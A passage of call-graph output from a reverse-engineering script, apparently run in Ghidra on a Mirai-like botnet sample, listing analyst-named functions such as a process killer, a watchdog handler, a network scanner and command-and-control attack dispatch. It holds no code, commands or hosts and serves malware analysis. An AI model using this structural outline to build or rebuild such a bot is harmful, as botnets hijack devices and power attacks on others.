      mw_get_table_entry @ 00013134 [already visited!]
      mw_encrypt_with_key @ 00013160 [already visited!]
      mw_itoa @ 000147e4
        mw_unsigned_modulo @ 00014a0c [already visited!]
        mw_unsigned_divide @ 000148fc [already visited!]
      mw_strcmp @ 000146d0
      mw_send @ 000154b4 [already visited!]
      mw_recv @ 00015454
        mw_get_errno_location @ 00015258 [already visited!]
      mw_strstr @ 00014414
      mw_strcasestr @ 00014644
      mw_strtol @ 0001447c [already visited!]
      mw_strncmp @ 00014754
      mw_get_errno_location @ 00015258 [already visited!]
      mw_sleep_w @ 00016564
        mw_set_bit @ 00015694 [already visited!]
        mw_rt_sigprocmask @ 00014f00 [already visited!]
        mw_test_bit @ 00015670 [already visited!]
        mw_set_signal_handler @ 00016a60 [already visited!]
        mw_get_errno_location @ 00015258 [already visited!]
        mw_nanosleep @ 00016efc
          mw_get_errno_location @ 00015258 [already visited!]
      mw_memmove @ 000152a0 [already visited!]
  mw_init_killer @ 0000e1bc
    mw_time @ 00014f54 [already visited!]
    mw_fork @ 00014cb0
      mw_get_errno_location @ 00015258 [already visited!]
    mw_sleep_w @ 00016564 [already visited!]
    mw_alloc @ 000156dc [already visited!]
    mw_decrypt_with_key @ 00013218 [already visited!]
    mw_get_table_entry @ 00013134 [already visited!]
    mw_strcpy @ 00014378 [already visited!]
    mw_getpid @ 00014cdc [already visited!]
    mw_itoa @ 000147e4 [already visited!]
    mw_open @ 00014db0
      mw_get_errno_location @ 00015258 [already visited!]
    mw_close @ 00014c84 [already visited!]
    mw_encrypt_with_key @ 00013160 [already visited!]
    mw_readlink @ 00014e78
      mw_get_errno_location @ 00015258 [already visited!]
    mw_memset_zero @ 000143f0 [already visited!]
    mw_opendir @ 0001508c
      mw_open @ 00014db0 [already visited!]
      mw_fstat @ 00016ba0
        mw_get_errno_location @ 00015258 [already visited!]
        mw_init_stat_buffer @ 000172bc
          mw_memset @ 000152c0 [already visited!]
      mw_fcntl @ 00014bc0 [already visited!]
      mw_get_errno_location @ 00015258 [already visited!]
      mw_close @ 00014c84 [already visited!]
      mw_alloc @ 000156dc [already visited!]
      mw_calloc @ 00015830 [already visited!]
      mw_free @ 00015888 [already visited!]
      mw_noop_1 @ 00016774 [already visited!]
    mw_readdir @ 00015188
      mw_noop_1 @ 00016774 [already visited!]
      mw_noop_2 @ 0001677c
      mw_process_dirs @ 00016bf0
        mw_getdents64 @ 00016c84
          mw_get_errno_location @ 00015258 [already visited!]
          mw__llseek @ 00016e98
            mw_get_errno_location @ 00015258 [already visited!]
          mw_memmove @ 000152a0 [already visited!]
        mw_memmove @ 000152b0 [already visited!]
    mw_atoi @ 00016324
      mw_unsigned_modulo @ 00014a0c [already visited!]
      mw_unsigned_divide @ 000148fc [already visited!]
      mw_get_errno_location @ 00015258 [already visited!]
    mw_unsigned_modulo @ 00014a0c [already visited!]
    mw_closedir @ 00014fd8
      mw_noop_1 @ 00016774 [already visited!]
      mw_get_errno_location @ 00015258 [already visited!]
      mw_noop_2 @ 0001677c [already visited!]
      mw_free @ 00015888 [already visited!]
      mw_close @ 00014c84 [already visited!]
    mw_strcasestr @ 00014644 [already visited!]
    mw_unlink @ 00014f80
      mw_get_errno_location @ 00015258 [already visited!]
    mw_kill @ 00014d84
      mw_get_errno_location @ 00015258 [already visited!]
    mw_getppid @ 00014d08 [already visited!]
    mw_strcmp @ 000146d0 [already visited!]
    mw_read @ 00014e4c
      mw_get_errno_location @ 00015258 [already visited!]
  mw_watchdog_handler @ 0000f3d0
    mw_fork @ 00014cb0 [already visited!]
    mw_decrypt_with_key @ 00013218 [already visited!]
    mw_get_table_entry @ 00013134 [already visited!]
    mw_open @ 00014db0 [already visited!]
    mw_ioctl @ 00014d34
      mw_get_errno_location @ 00015258 [already visited!]
    mw_sleep_w @ 00016564 [already visited!]
    mw_encrypt_with_key @ 00013160 [already visited!]
    mw_safe_exit @ 000164d0
      mw_noop_1 @ 00016774 [already visited!]
      mw_noop_2 @ 0001677c [already visited!]
      mw_run_exit_handlers @ 00016708
      mw_exit @ 00016b78
        mw_get_errno_location @ 00015258 [already visited!]
  mw_fork @ 00014cb0 [already visited!]
  mw_setsid @ 00014ed4
    mw_get_errno_location @ 00015258 [already visited!]
  mw_close @ 00014c84 [already visited!]
  mw_scanner @ 000100c8
    mw_fork @ 00014cb0 [already visited!]
    mw_get_local_ip @ 000145a8 [already visited!]
    mw_seed_prng @ 0000fc44 [already visited!]
    mw_time @ 00014f54 [already visited!]
    mw_calloc @ 00015830 [already visited!]
    mw_socket @ 00015544 [already visited!]
    mw_fcntl @ 00014bc0 [already visited!]
    mw_setsockopt @ 00015514 [already visited!]
    mw_xorshift128_ulong @ 0000fbec [already visited!]
    mw_decrypt @ 0000ff24
      mw_realloc @ 00015978 [already visited!]
      mw_strlen @ 00014350 [already visited!]
      mw_alloc @ 000156dc [already visited!]
      mw_memcpy @ 000143cc [already visited!]
    mw_checksum16 @ 0000e0b0 [already visited!]
    mw_tcp_checksum @ 0000e10c [already visited!]
    mw_sendto @ 000154e0 [already visited!]
    mw_get_errno_location @ 00015258 [already visited!]
    mw_recvfrom @ 00015480 [already visited!]
    mw_setup_connection @ 0000fe50
      mw_close @ 00014c84 [already visited!]
      mw_socket @ 00015544 [already visited!]
      mw_memset_zero @ 000143f0 [already visited!]
      mw_fcntl @ 00014bc0 [already visited!]
      mw_connect @ 000153cc [already visited!]
    mw_close @ 00014c84 [already visited!]
    mw__newselect @ 00014ea4 [already visited!]
    mw_getsockopt @ 00015424 [already visited!]
    mw_unsigned_modulo @ 00014a0c [already visited!]
    mw_decrypt_with_key @ 00013218 [already visited!]
    mw_get_table_entry @ 00013134 [already visited!]
    mw_strstr @ 00014414 [already visited!]
    mw_encrypt_with_key @ 00013160 [already visited!]
    mw_recv @ 00015454 [already visited!]
    mw_send @ 000154b4 [already visited!]
    mw_memmove @ 000152b0 [already visited!]
    mw_memmove @ 000152a0 [already visited!]
    mw_inet_aton_w @ 0001537c [already visited!]
    mw_connect @ 000153cc [already visited!]
  mw__newselect @ 00014ea4 [already visited!]
  mw_signed_modulo @ 00014ad8 [already visited!]
  mw_sleep_w @ 00016564 [already visited!]
  mw_get_errno_location @ 00015258 [already visited!]
  mw_recv @ 00015454 [already visited!]
  mw_socket @ 00015544 [already visited!]
  mw_fcntl @ 00014bc0 [already visited!]
  mw_connect @ 000153cc [already visited!]
  mw_getsockopt @ 00015424 [already visited!]
  mw_send @ 000154b4 [already visited!]
  mw_process_c2_cmd @ 00008320
    mw_calloc @ 00015830 [already visited!]
    mw_memcpy @ 000143cc [already visited!]
    mw_get_errno_location @ 00015258 [already visited!]
    mw_start_attack @ 00008230
      mw_fork @ 00014cb0 [already visited!]
      mw_sleep_w @ 00016564 [already visited!]
      mw_getppid @ 00014d08 [already visited!]
      mw_kill @ 00014d84 [already visited!]
      mw_safe_exit @ 000164d0 [already visited!]
    mw_free @ 00015888 [already visited!]

OrderedCallGraphGenerator.java> Finished!
```
